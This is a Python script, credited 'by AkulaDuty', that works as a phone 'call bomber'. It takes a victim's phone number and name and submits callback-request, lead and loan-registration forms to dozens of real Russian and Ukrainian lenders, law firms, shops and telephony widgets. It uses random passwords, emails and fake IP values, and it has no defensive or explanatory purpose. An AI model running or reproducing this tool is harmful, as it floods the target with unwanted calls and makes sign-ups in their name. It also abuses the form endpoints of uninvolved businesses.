import requests, datetime, random, transliterate
from colorama import Fore


truedata = str(datetime.datetime.today())
truedata = truedata.split(' ')[0]

names = ('Алексей', 'Иван', 'Константин', 'Петр', 'Семен', 'Матвей', 'Станислав', 'Владимир', 'Олег', 'Сергей')
surnames = (
'Иванов', 'Смирнов', 'Кузнецов', 'Попов', 'Васильев', 'Петров', 'Соколов', 'Михайлов', 'Новиков', 'Фёдоров',
'Морозов', 'Волков')
patronymics = (
'Богданович', 'Маркович', 'Олегович', 'Глебович', 'Александрович', 'Дмитриевич', 'Егорович', 'Георгиевич',
'Львович', 'Кириллович')

randomemail = transliterate.translit(random.choice(names), reversed=True) + transliterate.translit(random.choice(surnames), reversed=True) + '@gmail.com'
randompassword = transliterate.translit(random.choice(names), reversed=True) + transliterate.translit(random.choice(surnames), reversed=True)
randomtimezone = int(random.random() * 10)
randomzaim = int((random.random() * 10) + 10)
randomid6 = str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9))
problem = 'Здравствуйте, у меня есть проблема'


def main():
    logo = r'''
 by AkulaDuty
    '''

    print(logo)

    phoneNum = input('Номер телефона: ')
    name = input('Имя: ')

    if name.strip() == '':
        name = random.choice(names)
    try:
        requests.post('http://smart-lift.com.ua/1.php', data={'txtname': name, 'txtphone': phoneNum, 'valTrFal': 'valTrFal_true', 'test': ''})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')

    try:
        requests.post('https://junker.kiev.ua/postmaster.php', data={'name': name, 'tel': phoneNum, 'action': 'callme'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://www.big-partner.kh.ua/index.php?route=unishop/request/mail', data={'type': 'Заказ звонка', 'customername': name, 'customerphoneNum': phoneNum})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://red-caviar.biz.ua/order.php', data={'name': name, 'phone': phoneNum, 'meta': '2'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://novogodneepostelnoe.ru/index.php?route=extension/module/callback', data={'name': name, 'phone': phoneNum, 'comment': '', 'action': 'send'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://bistrodengi.ru/ajax/lead.php', data={'fio': name, 'phone': phoneNum})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://zaymigo.com/register',
        data={'role': 'borrower', 'registerphoneNum': phoneNum, 'password': randompassword, 'password_confirm': randompassword, 'register_agreements': 1,
        'register_agreements': 1, 'timezone': randomtimezone, 'step': 1, 'sum': 10000,
        'repayment_method': 'once', 'period': 12, 'promoCode': '', 'appliedPromoCode': '',
        'appliedDiscount': ''})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://www.zaim-express.ru/engine/orders2.php',
                                    data={'type_amount': 0, 'phone': phoneNum, 'source': '', 'clickid': '', 'webid': '',
                                          'reffer': 'www.google.com', 'site': 'www.zaim-express.ru/'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://xn--80acmlhv0b.xn--80anhm9e.xn--p1ai/gate/public/api/v1/user/phone',
                              data={'phone': phoneNum})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://www.moneza.ru/ws/public/callback-request',
                               data={'clientFullName': name, 'phoneNumber': phoneNum, 'timezoneOffsetString': -420})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://timezaim.ru/app/',
                                 data={'SUMMA': randomzaim, 'DAY': 90, 'TARIFname': '', 'TARIF': 'main', 'SUM': '',
                                       'DAYS': '', 'STEP': -1, 'main': 'Y', 'needphoneNum': phoneNum})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://telephony.jivosite.com/api/1/sites/359606/widgets/jbgpFn43Y1/clients/' + str(
            random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(
            random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + '/telephony/callback',
                                 data={'phone': phoneNum, 'invitationproblem': ''})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://api.creditter.ru/feedback/phone', json={'phone': phoneNum})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://creditplus.ru/wp-core/wp-admin/admin-ajax.php?action=callbackPhone',
                                   data={'number': phoneNum, 'confirmation_code': '', 'action': 'callbackPhone'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://telephony.jivosite.com/api/1/sites/6235/widgets/zjrL6mQMKT/clients/' + str(
            random.randint(1, 9)) + str(random.randint(1, 9)) + str(random.randint(1, 9)) + str(
            random.randint(1, 9)) + str(random.randint(1, 9)) + '/telephony/callback',
                                data={'phone': phoneNum, 'invitationproblem': ''})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')

    try:
        requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php',
                                   data={'text_quest_banner': problem, 'name': name, 'city': 'Москва', 'tel': phoneNum,
                                         'ip': '192.168.1.777', 'form_page': 'https://bukvaprava.ru/', 'referer': '',
                                         'action': 'ajax-lead'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://www.yurist-online.net/lead_question',
                                     data={'region': '27', 'question': problem, 'name': name, 'phone': phoneNum,
                                           'email': randomemail.lower(), 'partner_id': '13'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php',
                                  data={'custom_U22127': phoneNum})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php',
                                  data={'phone': '+' + phoneNum, 'name': name, 'sid': '*', 'gclid': '0',
                                        'openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium', 'utm': ''})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://rossovet.ru/qa/msgsave/save',
                                 data={'name': name, 'comment': problem, 'city': 'Москва',
                                       'phoneprefix': '(' + phoneNum + ')', 'phone': phoneNum, 'partnerID': '10',
                                       'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8',
                                       'checkcode': '15'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost',
                                  data={'Name': name, 'Phone': phoneNum, 'Description': problem})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://epleads.ru/gate/api.php',
                                data={'question': problem, 'region': 'Москва', 'first_lastname': name,
                                      'phone': phoneNum, 'ofrid': '1', 'wid': '3', 'presetid': '4',
                                      'referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html',
                                      'ip': '213.154.55.496', 'mobile': '0',
                                      'template': 'form_master.new.fix.metrik_lawyer-blue-default', 'product': 'lawyer',
                                      'userSoftData': '*'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://pravonedv.ru/proxy_8d34201a5b.php?a___=1',
                                  data={'email': randomemail.lower(), 'phone': phoneNum,
                                        'location': 'Москва, Россия', 'name': name, 'offer': '0', 'ip': '263.87.162.98',
                                        'device': 'desktop', 'token': '*', 'template': 'two_page3',
                                        'referrer': 'https://yandex.ru/clck/', 'domain': 'pravonedv.ru', 'wm_id': '548',
                                        'url': 'https://pravonedv.ru/besplatnye-onlajn-konsultacii-yurista'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post(
            'https://xn----etbqwledi5fza.xn--p1ai/wp-json/contact-form-7/v1/contact-forms/295/feedback',
            data={'_wpcf7': '295', '_wpcf7_version': '5.0.5', '_wpcf7_locale': 'ru_RU',
                  '_wpcf7_unit_tag': 'wpcf7-f295-o2', '_wpcf7_container_post': '0', 'text-838': name,
                  'tel-231': phoneNum, 'textarea-472': problem, 'hidden-278': 'Главная'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('http://www.gurist.ru/wp-json/contact-form-7/v1/contact-forms/3591/feedback',
                               data={'_wpcf7': '3591', '_wpcf7_version': '5.0', '_wpcf7_locale': 'ru_RU',
                                     '_wpcf7_unit_tag': 'wpcf7-f3591-o1', '_wpcf7_container_post': '0',
                                     'your-name': name, 'tel-147': problem})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://moskva.beeline.ru/customers/products/mobile/services/createmnporder/',
                                data={'leadName': 'PodborSim', 'phone': phoneNum, 'region': '98140'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://advokatmakeev.ru/form.php',
                                      data={'oname': name, 'otel': phoneNum, 'omail': '', 'omess': problem,
                                            'otype': '1'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('http://mkamsk.ru/apply_auto_form',
                               data={'Form[9]': name, 'Form[12]': phoneNum, 'Form[11]': problem,
                                     'url': 'http://mkamsk.ru/', 'check': 'check'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://usachev.vip/wp-admin/admin-ajax.php',
                                data={'action': 'bazz_widget_action', 'phone': '+' + phoneNum, 'name': ''})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('http://pravo-sfera.ru/auxpage_zayavk/',
                                   data={'cname': name, 'c_tel': phoneNum, 'quest': problem,
                                         'uest_go': 'Задать вопрос'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('https://urist-expert24.ru/send-lead/',
                                      data={'name': name, 'phone': phoneNum,
                                            'form-name': 'Заказ обратного звонка'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('http://law-divorce.ru/wp-admin/admin-ajax.php',
                                   data={'ip_address': '', 'ip_country': '', 'ip_region': '', 'ip_city': '', 'url': '',
                                         'action': 'lld_send_lead', 'text': problem, 'name': name,
                                         'telephone': '+' + phoneNum, 'city': 'Москва'})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('http://www.gos-urist.ru/send.php',
                                 {'name': name, 'code': phoneNum, 'phone': phoneNum, 'issue': problem})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.post('http://9911030.ru/orderform.php',
                                  {'name': name, 'phone': phoneNum, 'message': problem})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')
    try:
        requests.get('https://findclone.ru/register?phone=' + phoneNum, params={'phone': phoneNum})
        print(Fore.GREEN + 'Вам позвонят, ждите!')
    except:
        print(Fore.RED + 'Вам не позвонят :(')

    print('Готово!')


if __name__ == '__main__':
    main()
